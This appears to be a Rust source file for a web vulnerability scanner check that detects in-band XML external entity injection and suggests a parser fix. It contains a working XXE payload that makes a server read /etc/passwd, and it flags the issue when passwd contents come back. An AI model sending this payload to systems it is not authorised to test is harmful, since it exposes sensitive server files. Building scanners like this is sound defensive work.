//! XXE — XML external entity injection (in-band).

use async_trait::async_trait;
use lancer_core::HttpRequest;
use lancer_storage::issues::{Confidence, Issue, Severity};
use lancer_tools::HttpClient;

use crate::insertion::InsertionPoint;
use crate::ActiveCheck;

pub struct XxeCheck;

const PAYLOAD: &str = r#"<?xml version="1.0"?><!DOCTYPE r [<!ENTITY l SYSTEM "file:///etc/passwd">]><r>&l;</r>"#;

#[async_trait]
impl ActiveCheck for XxeCheck {
    fn id(&self) -> &'static str { "active.xxe" }
    fn name(&self) -> &'static str { "XML external entity injection" }
    async fn run(&self, client: &HttpClient, base: &HttpRequest, _point: &InsertionPoint) -> Vec<Issue> {
        let ct = base.header("Content-Type").unwrap_or("").to_lowercase();
        if !ct.contains("xml") { return Vec::new(); }
        let mut req = base.clone();
        req.body = bytes::Bytes::from(PAYLOAD);
        req.set_header("Content-Length", req.body.len().to_string());
        let Ok(resp) = client.send(&req).await else { return Vec::new() };
        let body = resp.body_text().unwrap_or("");
        if body.contains("root:x:0:") || body.contains("/bin/bash") {
            let mut i = Issue::new(base.meta.host.clone(), base.url(), "XXE",
                Severity::Critical, Confidence::Firm,
                "external entity referencing /etc/passwd was resolved server-side".to_string());
            i.remediation = Some("Disable external-entity resolution in the XML parser (LIBXML_NOENT/NONET, disallow-doctype).".into());
            i.check_id = Some(self.id().into());
            return vec![i];
        }
        Vec::new()
    }
}
